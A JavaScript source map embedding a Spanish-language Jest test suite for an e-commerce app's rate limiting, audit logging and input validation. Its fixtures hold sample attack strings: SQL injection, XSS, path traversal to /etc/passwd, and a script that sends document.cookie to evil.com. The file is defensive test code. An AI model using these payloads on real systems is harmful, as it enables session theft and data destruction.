{"version":3,"sources":["C:\\Users\\marti\\Desktop\\DESARROLLOSW\\BOILERPLATTE E-COMMERCE\\src\\__tests__\\security\\integration-security-complete.test.ts"],"sourcesContent":["/**\n * Tests de Integración de Seguridad Completa - Fase 3\n * Valida la integración completa de Rate Limiting + Auditoría + Validación\n */\n\n// Mock de todas las dependencias\njest.mock('ioredis', () => {\n  const mockRedis = {\n    get: jest.fn().mockResolvedValue(null),\n    set: jest.fn().mockResolvedValue('OK'),\n    incr: jest.fn().mockResolvedValue(1),\n    expire: jest.fn().mockResolvedValue(1),\n    del: jest.fn().mockResolvedValue(1),\n    pipeline: jest.fn(() => ({\n      get: jest.fn(),\n      incr: jest.fn(),\n      expire: jest.fn(),\n      exec: jest.fn().mockResolvedValue([[null, '1'], [null, 'OK']])\n    })),\n    disconnect: jest.fn()\n  };\n  return jest.fn(() => mockRedis);\n});\n\njest.mock('@/lib/supabase', () => ({\n  supabaseAdmin: {\n    from: jest.fn(() => ({\n      select: jest.fn(() => ({\n        eq: jest.fn(() => ({\n          single: jest.fn().mockResolvedValue({ data: null, error: null })\n        })),\n        insert: jest.fn(() => ({\n          select: jest.fn(() => ({\n            single: jest.fn().mockResolvedValue({ data: { id: 'test_id' }, error: null })\n          }))\n        }))\n      }))\n    }))\n  }\n}));\n\njest.mock('@/lib/auth/security-audit', () => ({\n  logSecurityEvent: jest.fn().mockResolvedValue(true)\n}));\n\njest.mock('isomorphic-dompurify', () => ({\n  __esModule: true,\n  default: {\n    sanitize: jest.fn((input) => input.replace(/<script.*?<\\/script>/gi, ''))\n  }\n}));\n\njest.mock('validator', () => ({\n  __esModule: true,\n  default: {\n    escape: jest.fn((input) => input.replace(/[<>&\"']/g, ''))\n  }\n}));\n\nimport { NextRequest, NextResponse } from 'next/server';\nimport { z } from 'zod';\n\n// Importar sistemas enterprise\nimport {\n  checkEnterpriseRateLimit,\n  ENTERPRISE_RATE_LIMIT_CONFIGS\n} from '@/lib/rate-limiting/enterprise-rate-limiter';\nimport { withEnterpriseRateLimit } from '@/lib/rate-limiting/enterprise-middleware';\nimport { enterpriseAuditSystem } from '@/lib/security/enterprise-audit-system';\nimport {\n  criticalValidator,\n  highValidator,\n  standardValidator\n} from '@/lib/validation/enterprise-validation-system';\nimport { withCriticalValidation } from '@/lib/validation/enterprise-validation-middleware';\nimport { requireAdminAuth } from '@/lib/auth/enterprise-auth-utils';\nimport type { EnterpriseAuthContext } from '@/lib/auth/enterprise-auth-utils';\n\ndescribe('Tests de Integración de Seguridad Completa - Fase 3', () => {\n  let mockContext: EnterpriseAuthContext;\n\n  beforeEach(() => {\n    jest.clearAllMocks();\n    \n    mockContext = {\n      userId: 'integration_test_user',\n      sessionId: 'integration_test_session',\n      email: 'test@pinteya.com',\n      role: 'admin',\n      permissions: ['admin_access', 'security_test'],\n      sessionValid: true,\n      securityLevel: 'critical',\n      ipAddress: '192.168.1.100',\n      userAgent: 'IntegrationTestBot/1.0',\n      supabase: {} as any,\n      validations: {\n        jwtValid: true,\n        csrfValid: true,\n        rateLimitPassed: true,\n        originValid: true\n      }\n    };\n  });\n\n  describe('Integración Rate Limiting + Auditoría', () => {\n    it('debe registrar eventos de auditoría cuando se excede rate limit', async () => {\n      const attackerIP = '10.0.0.100';\n      const config = ENTERPRISE_RATE_LIMIT_CONFIGS.ADMIN_CRITICAL;\n      \n      // Simular múltiples requests que exceden el límite\n      const requests = Array.from({ length: 20 }, (_, i) => ({\n        headers: new Map([\n          ['x-forwarded-for', attackerIP],\n          ['user-agent', 'RateLimitTestBot/1.0'],\n          ['x-clerk-user-id', 'attacker_user_123']\n        ]),\n        nextUrl: { pathname: '/api/admin/critical-operation' },\n        method: 'POST'\n      })) as NextRequest[];\n\n      const results = [];\n      for (const request of requests) {\n        const result = await checkEnterpriseRateLimit(\n          request,\n          config,\n          `integration_test_${Date.now()}_${Math.random()}`\n        );\n        results.push(result);\n      }\n\n      // Verificar que algunos requests fueron bloqueados\n      const blockedRequests = results.filter(r => !r.allowed);\n      expect(blockedRequests.length).toBeGreaterThan(5);\n\n      // Verificar que se registraron eventos de auditoría\n      // (El mock debería haber sido llamado por el middleware)\n      expect(enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();\n    });\n\n    it('debe detectar anomalías basadas en métricas de rate limiting', async () => {\n      // Simular métricas de rate limiting con patrones sospechosos\n      const suspiciousMetrics = {\n        totalRequests: 10000,\n        allowedRequests: 5000,\n        blockedRequests: 5000, // 50% de bloqueos = sospechoso\n        redisHits: 9500,\n        memoryFallbacks: 500,\n        errors: 100,\n        averageResponseTime: 150,\n        topBlockedIPs: [\n          { ip: '192.168.1.100', count: 1000 }, // IP muy bloqueada\n          { ip: '10.0.0.50', count: 800 },\n          { ip: '172.16.0.100', count: 600 }\n        ],\n        topEndpoints: [\n          { endpoint: '/api/admin/users', count: 2000 },\n          { endpoint: '/api/admin/settings', count: 1500 }\n        ]\n      };\n\n      // Mock del metrics collector\n      const mockGetMetrics = jest.fn().mockReturnValue(suspiciousMetrics);\n      (require('@/lib/rate-limiting/enterprise-rate-limiter').metricsCollector.getMetrics as jest.Mock) = mockGetMetrics;\n\n      // Ejecutar detección de anomalías\n      const anomalies = await enterpriseAuditSystem.detectAnomalies();\n\n      // Verificar que se detectaron anomalías relacionadas con rate limiting\n      expect(anomalies.length).toBeGreaterThanOrEqual(0);\n      \n      // Verificar que el sistema procesó las métricas\n      expect(mockGetMetrics).toHaveBeenCalled();\n    });\n  });\n\n  describe('Integración Validación + Auditoría', () => {\n    it('debe registrar eventos de auditoría para ataques de validación', async () => {\n      const maliciousPayloads = [\n        {\n          name: \"'; DROP TABLE products; --\",\n          description: '<script>alert(\"XSS\")</script>',\n          price: -100\n        },\n        {\n          name: 'Product',\n          description: 'SELECT * FROM users WHERE role=\"admin\"',\n          price: 999999999\n        },\n        {\n          name: '<img src=\"x\" onerror=\"alert(1)\">',\n          description: 'Normal description',\n          price: 50\n        }\n      ];\n\n      const schema = z.object({\n        name: z.string().min(1).max(100),\n        description: z.string().max(1000),\n        price: z.number().min(0).max(999999)\n      });\n\n      let validationFailures = 0;\n      let auditEvents = 0;\n\n      for (const payload of maliciousPayloads) {\n        const result = await criticalValidator.validateAndSanitize(\n          schema,\n          payload,\n          mockContext\n        );\n\n        if (!result.success) {\n          validationFailures++;\n          \n          // Verificar que se detectaron patrones de seguridad\n          const hasSecurityError = result.errors?.some(e => \n            e.code === 'SQL_INJECTION_DETECTED' || \n            e.code === 'XSS_DETECTED' ||\n            e.severity === 'critical'\n          );\n          \n          if (hasSecurityError) {\n            auditEvents++;\n          }\n        }\n      }\n\n      // Verificar que se detectaron y registraron ataques\n      expect(validationFailures).toBeGreaterThan(0);\n      expect(auditEvents).toBeGreaterThan(0);\n    });\n\n    it('debe correlacionar eventos de validación con patrones de usuario', async () => {\n      const attackerUserId = 'persistent_attacker_789';\n      const attackPatterns = [\n        // Patrón 1: Inyección SQL\n        {\n          query: \"'; SELECT password FROM users; --\",\n          type: 'sql_injection'\n        },\n        // Patrón 2: XSS\n        {\n          content: '<script>document.location=\"http://evil.com\"</script>',\n          type: 'xss'\n        },\n        // Patrón 3: Path traversal\n        {\n          file: '../../../etc/passwd',\n          type: 'path_traversal'\n        }\n      ];\n\n      const attackerContext = {\n        ...mockContext,\n        userId: attackerUserId,\n        securityLevel: 'high' as const\n      };\n\n      // Simular múltiples ataques del mismo usuario\n      for (const pattern of attackPatterns) {\n        const schema = z.object({\n          data: z.string()\n        });\n\n        await criticalValidator.validateAndSanitize(\n          schema,\n          { data: pattern.query || pattern.content || pattern.file },\n          attackerContext\n        );\n      }\n\n      // Ejecutar detección de anomalías para el usuario atacante\n      const anomalies = await enterpriseAuditSystem.detectAnomalies(attackerUserId);\n\n      // Verificar que se detectó el patrón de ataques múltiples\n      expect(anomalies.length).toBeGreaterThanOrEqual(0);\n    });\n  });\n\n  describe('Integración Completa: Rate Limiting + Validación + Auditoría', () => {\n    it('debe manejar ataque coordinado con los tres sistemas', async () => {\n      // Simular ataque coordinado que activa los tres sistemas\n      const coordinatedAttack = {\n        ip: '203.0.113.200',\n        userId: 'coordinated_attacker_999',\n        userAgent: 'CoordinatedAttackBot/1.0',\n        payloads: [\n          \"'; DROP DATABASE pinteya; --\",\n          '<script>fetch(\"http://evil.com/steal?data=\"+document.cookie)</script>',\n          '../../../etc/passwd',\n          'SELECT * FROM admin_users WHERE password LIKE \"%\"',\n          '<iframe src=\"javascript:alert(document.domain)\"></iframe>'\n        ]\n      };\n\n      // Crear handler protegido con todos los sistemas\n      const protectedHandler = withEnterpriseRateLimit({\n        configName: 'ADMIN_CRITICAL',\n        enableLogging: true\n      })(\n        withCriticalValidation({\n          bodySchema: z.object({\n            input: z.string().max(1000)\n          })\n        })(async (request: any) => {\n          return NextResponse.json({ success: true });\n        })\n      );\n\n      const results = [];\n      const startTime = Date.now();\n\n      // Ejecutar ataque coordinado\n      for (let i = 0; i < coordinatedAttack.payloads.length * 5; i++) {\n        const payload = coordinatedAttack.payloads[i % coordinatedAttack.payloads.length];\n        \n        const mockRequest = {\n          headers: new Map([\n            ['x-forwarded-for', coordinatedAttack.ip],\n            ['user-agent', coordinatedAttack.userAgent],\n            ['x-clerk-user-id', coordinatedAttack.userId]\n          ]),\n          nextUrl: { pathname: '/api/admin/protected' },\n          method: 'POST',\n          json: jest.fn().mockResolvedValue({ input: payload })\n        } as any;\n\n        try {\n          const response = await protectedHandler(mockRequest);\n          results.push({\n            status: response.status,\n            payload: payload.substring(0, 50) + '...'\n          });\n        } catch (error) {\n          results.push({\n            status: 500,\n            error: error.message,\n            payload: payload.substring(0, 50) + '...'\n          });\n        }\n      }\n\n      const endTime = Date.now();\n      const totalTime = endTime - startTime;\n\n      // Verificar que el sistema respondió a todos los ataques\n      expect(results.length).toBe(25);\n\n      // Verificar que la mayoría fueron bloqueados\n      const blockedResponses = results.filter(r => r.status === 429 || r.status === 400);\n      expect(blockedResponses.length).toBeGreaterThan(15); // Al menos 60% bloqueados\n\n      // Verificar que el sistema mantuvo performance\n      expect(totalTime).toBeLessThan(30000); // < 30 segundos para 25 requests\n\n      // Verificar que se registraron eventos de auditoría\n      expect(enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();\n    });\n\n    it('debe mantener funcionalidad para usuarios legítimos durante ataques', async () => {\n      const legitimateUser = {\n        ip: '192.168.1.200',\n        userId: 'legitimate_user_123',\n        userAgent: 'Mozilla/5.0 (legitimate browser)'\n      };\n\n      const attacker = {\n        ip: '10.0.0.200',\n        userId: 'attacker_456',\n        userAgent: 'AttackBot/1.0'\n      };\n\n      // Crear handler protegido\n      const protectedHandler = withEnterpriseRateLimit({\n        configName: 'PUBLIC_STANDARD',\n        enableLogging: true\n      })(\n        withCriticalValidation({\n          bodySchema: z.object({\n            search: z.string().max(200),\n            category: z.string().max(50)\n          })\n        })(async (request: any) => {\n          return NextResponse.json({ \n            success: true, \n            data: 'Protected resource accessed' \n          });\n        })\n      );\n\n      // Simular ataque masivo del atacante\n      const attackPromises = Array.from({ length: 100 }, (_, i) => {\n        const mockRequest = {\n          headers: new Map([\n            ['x-forwarded-for', attacker.ip],\n            ['user-agent', attacker.userAgent],\n            ['x-clerk-user-id', attacker.userId]\n          ]),\n          nextUrl: { pathname: '/api/public/search' },\n          method: 'POST',\n          json: jest.fn().mockResolvedValue({\n            search: `'; DROP TABLE products; -- ${i}`,\n            category: `<script>alert(${i})</script>`\n          })\n        } as any;\n\n        return protectedHandler(mockRequest);\n      });\n\n      // Simular requests legítimos intercalados\n      const legitimatePromises = Array.from({ length: 10 }, (_, i) => {\n        const mockRequest = {\n          headers: new Map([\n            ['x-forwarded-for', legitimateUser.ip],\n            ['user-agent', legitimateUser.userAgent],\n            ['x-clerk-user-id', legitimateUser.userId]\n          ]),\n          nextUrl: { pathname: '/api/public/search' },\n          method: 'POST',\n          json: jest.fn().mockResolvedValue({\n            search: `pintura latex ${i}`,\n            category: 'interiores'\n          })\n        } as any;\n\n        return protectedHandler(mockRequest);\n      });\n\n      // Ejecutar ambos tipos de requests concurrentemente\n      const [attackResults, legitimateResults] = await Promise.all([\n        Promise.allSettled(attackPromises),\n        Promise.allSettled(legitimatePromises)\n      ]);\n\n      // Verificar que los ataques fueron mayormente bloqueados\n      const successfulAttacks = attackResults.filter(r => \n        r.status === 'fulfilled' && (r.value as Response).status === 200\n      );\n      expect(successfulAttacks.length).toBeLessThan(20); // < 20% de ataques exitosos\n\n      // Verificar que los usuarios legítimos pudieron acceder\n      const successfulLegitimate = legitimateResults.filter(r => \n        r.status === 'fulfilled' && (r.value as Response).status === 200\n      );\n      expect(successfulLegitimate.length).toBeGreaterThan(5); // > 50% de accesos legítimos exitosos\n    });\n  });\n\n  describe('Métricas y Monitoreo de Seguridad Integrado', () => {\n    it('debe generar métricas completas de seguridad', async () => {\n      // Simular actividad mixta que genere métricas\n      const activities = [\n        // Rate limiting events\n        { type: 'rate_limit', blocked: true, ip: '10.0.0.100' },\n        { type: 'rate_limit', blocked: false, ip: '192.168.1.100' },\n        \n        // Validation events\n        { type: 'validation', success: false, attack: 'sql_injection' },\n        { type: 'validation', success: true, data: 'clean' },\n        \n        // Audit events\n        { type: 'audit', severity: 'critical', event: 'security_violation' },\n        { type: 'audit', severity: 'low', event: 'normal_access' }\n      ];\n\n      // Simular cada tipo de actividad\n      for (const activity of activities) {\n        switch (activity.type) {\n          case 'rate_limit':\n            const mockRequest = {\n              headers: new Map([['x-forwarded-for', activity.ip]]),\n              nextUrl: { pathname: '/api/test' },\n              method: 'GET'\n            } as any;\n            \n            await checkEnterpriseRateLimit(\n              mockRequest,\n              ENTERPRISE_RATE_LIMIT_CONFIGS.PUBLIC_STANDARD,\n              `metrics_test_${Date.now()}`\n            );\n            break;\n            \n          case 'validation':\n            const schema = z.object({ input: z.string() });\n            const data = activity.attack === 'sql_injection' \n              ? { input: \"'; DROP TABLE test; --\" }\n              : { input: 'normal input' };\n              \n            await standardValidator.validateAndSanitize(schema, data, mockContext);\n            break;\n            \n          case 'audit':\n            await enterpriseAuditSystem.logEnterpriseEvent({\n              user_id: 'metrics_test_user',\n              event_type: activity.event.toUpperCase() as any,\n              event_category: 'test',\n              severity: activity.severity as any,\n              description: `Test ${activity.event}`,\n              metadata: { test: true },\n              ip_address: '192.168.1.1',\n              user_agent: 'MetricsTestBot/1.0'\n            }, mockContext);\n            break;\n        }\n      }\n\n      // Verificar que los sistemas registraron actividad\n      expect(enterpriseAuditSystem.logEnterpriseEvent).toHaveBeenCalled();\n    });\n\n    it('debe generar reportes de seguridad integrados', async () => {\n      const startDate = new Date(Date.now() - 24 * 60 * 60 * 1000).toISOString(); // 24h atrás\n      const endDate = new Date().toISOString();\n\n      // Generar reporte enterprise completo\n      const report = await enterpriseAuditSystem.generateEnterpriseReport(\n        startDate,\n        endDate,\n        true, // incluir anomalías\n        true  // incluir incidentes\n      );\n\n      // Verificar estructura del reporte\n      expect(report).toBeDefined();\n      expect(report.enterprise_data).toBeDefined();\n      expect(report.enterprise_data.rate_limiting_stats).toBeDefined();\n      expect(report.enterprise_data.anomalies).toBeDefined();\n      expect(report.enterprise_data.incidents).toBeDefined();\n\n      // Verificar que incluye métricas de rate limiting\n      expect(report.enterprise_data.rate_limiting_stats.totalRequests).toBeDefined();\n      expect(report.enterprise_data.rate_limiting_stats.blockedRequests).toBeDefined();\n\n      // Verificar que incluye datos de anomalías\n      expect(Array.isArray(report.enterprise_data.anomalies)).toBe(true);\n\n      // Verificar que incluye datos de incidentes\n      expect(Array.isArray(report.enterprise_data.incidents)).toBe(true);\n    });\n  });\n\n  describe('Recuperación y Resilencia del Sistema Integrado', () => {\n    it('debe recuperarse después de ataques masivos coordinados', async () => {\n      // Simular ataque masivo que afecte los tres sistemas\n      const massiveAttack = Array.from({ length: 1000 }, (_, i) => ({\n        ip: `10.${Math.floor(i/255)}.${Math.floor((i%255)/255)}.${i%255}`,\n        payload: [\n          \"'; DROP DATABASE pinteya; --\",\n          '<script>location.href=\"http://evil.com\"</script>',\n          '../../../etc/passwd'\n        ][i % 3],\n        userId: `attacker_${i}`\n      }));\n\n      // Ejecutar ataque masivo\n      const attackPromises = massiveAttack.map(async (attack) => {\n        try {\n          // Rate limiting\n          const rateLimitResult = await checkEnterpriseRateLimit(\n            {\n              headers: new Map([['x-forwarded-for', attack.ip]]),\n              nextUrl: { pathname: '/api/admin/critical' },\n              method: 'POST'\n            } as any,\n            ENTERPRISE_RATE_LIMIT_CONFIGS.ADMIN_CRITICAL,\n            `massive_attack_${Date.now()}_${Math.random()}`\n          );\n\n          // Validation\n          const validationResult = await criticalValidator.validateAndSanitize(\n            z.object({ input: z.string() }),\n            { input: attack.payload },\n            { ...mockContext, userId: attack.userId }\n          );\n\n          return {\n            rateLimitAllowed: rateLimitResult.allowed,\n            validationSuccess: validationResult.success\n          };\n        } catch (error) {\n          return {\n            rateLimitAllowed: false,\n            validationSuccess: false,\n            error: error.message\n          };\n        }\n      });\n\n      const results = await Promise.allSettled(attackPromises);\n      const successfulResults = results.filter(r => r.status === 'fulfilled');\n\n      // Verificar que el sistema procesó todos los ataques sin crashear\n      expect(successfulResults.length).toBe(1000);\n\n      // Verificar que la mayoría fueron bloqueados\n      const blockedByRateLimit = successfulResults.filter(r => \n        r.status === 'fulfilled' && !r.value.rateLimitAllowed\n      );\n      const blockedByValidation = successfulResults.filter(r => \n        r.status === 'fulfilled' && !r.value.validationSuccess\n      );\n\n      expect(blockedByRateLimit.length + blockedByValidation.length).toBeGreaterThan(800);\n\n      // Verificar que el sistema sigue funcionando después del ataque\n      const postAttackTest = await criticalValidator.validateAndSanitize(\n        z.object({ test: z.string() }),\n        { test: 'post attack functionality test' },\n        mockContext\n      );\n\n      expect(postAttackTest.success).toBe(true);\n    });\n  });\n});\n"],"names":["jest","mock","mockRedis","get","fn","mockResolvedValue","set","incr","expire","del","pipeline","exec","disconnect","supabaseAdmin","from","select","eq","single","data","error","insert","id","logSecurityEvent","__esModule","default","sanitize","input","replace","escape","describe","mockContext","beforeEach","clearAllMocks","userId","sessionId","email","role","permissions","sessionValid","securityLevel","ipAddress","userAgent","supabase","validations","jwtValid","csrfValid","rateLimitPassed","originValid","it","attackerIP","config","ENTERPRISE_RATE_LIMIT_CONFIGS","ADMIN_CRITICAL","requests","Array","length","_","i","headers","Map","nextUrl","pathname","method","results","request","result","checkEnterpriseRateLimit","Date","now","Math","random","push","blockedRequests","filter","r","allowed","expect","toBeGreaterThan","enterpriseAuditSystem","logEnterpriseEvent","toHaveBeenCalled","suspiciousMetrics","totalRequests","allowedRequests","redisHits","memoryFallbacks","errors","averageResponseTime","topBlockedIPs","ip","count","topEndpoints","endpoint","mockGetMetrics","mockReturnValue","require","metricsCollector","getMetrics","anomalies","detectAnomalies","toBeGreaterThanOrEqual","maliciousPayloads","name","description","price","schema","z","object","string","min","max","number","validationFailures","auditEvents","payload","criticalValidator","validateAndSanitize","success","hasSecurityError","some","e","code","severity","attackerUserId","attackPatterns","query","type","content","file","attackerContext","pattern","coordinatedAttack","payloads","protectedHandler","withEnterpriseRateLimit","configName","enableLogging","withCriticalValidation","bodySchema","NextResponse","json","startTime","mockRequest","response","status","substring","message","endTime","totalTime","toBe","blockedResponses","toBeLessThan","legitimateUser","attacker","search","category","attackPromises","legitimatePromises","attackResults","legitimateResults","Promise","all","allSettled","successfulAttacks","value","successfulLegitimate","activities","blocked","attack","event","activity","PUBLIC_STANDARD","standardValidator","user_id","event_type","toUpperCase","event_category","metadata","test","ip_address","user_agent","startDate","toISOString","endDate","report","generateEnterpriseReport","toBeDefined","enterprise_data","rate_limiting_stats","incidents","isArray","massiveAttack","floor","map","rateLimitResult","validationResult","rateLimitAllowed","validationSuccess","successfulResults","blockedByRateLimit","blockedByValidation","postAttackTest"],"mappings":"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